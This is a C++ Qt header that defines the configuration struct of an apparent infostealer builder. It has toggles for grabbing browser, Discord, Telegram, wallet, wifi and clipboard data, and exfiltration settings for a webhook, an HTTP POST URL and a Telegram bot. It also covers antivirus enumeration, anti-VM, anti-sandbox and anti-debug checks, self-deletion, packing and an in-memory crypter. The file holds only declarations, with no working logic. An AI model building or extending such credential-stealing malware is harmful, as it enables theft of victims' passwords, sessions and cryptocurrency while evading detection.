#ifndef CONFIG_H
#define CONFIG_H

#include <QString>
#include <QJsonObject>

struct StealerConfig {
    // Grabber settings
    bool grabChrome;
    bool grabFirefox;
    bool grabEdge;
    bool grabBrave;
    bool grabDiscord;
    bool grabTelegram;
    bool grabWallets;
    bool grabWifi;
    bool grabClipboard;
    
    // Exfiltration settings
    QString webhookUrl;
    QString httpPostUrl;
    QString telegramToken;
    QString telegramChatId;
    
    // Screenshot settings
    bool captureScreen;
    
    // System info settings
    bool collectHWID;
    bool collectIP;
    bool collectOSInfo;
    bool collectInstalledAV;
    bool collectProcessList;
    bool collectSpecs;
    
    // Stealth settings
    QString processName;
    QString mutexName;
    bool selfDestruct;
    bool meltFile;
    
    // Anti-analysis settings
    bool antiVM;
    bool antiSandbox;
    bool antiDebug;
    bool sleepEvasion;
    
    // Build settings
    QString outputName;
    QString iconPath;
    QString architecture; // "x86" or "x64"
    bool obfuscate;
    bool upxPack;
    bool useCrypter; // Encrypt stub and execute from memory
    QString compiler; // "auto", "mingw", "msvc"
    
    StealerConfig();
    QJsonObject toJson() const;
    void fromJson(const QJsonObject& json);
    bool saveToFile(const QString& filename) const;
    bool loadFromFile(const QString& filename);
};

#endif // CONFIG_H


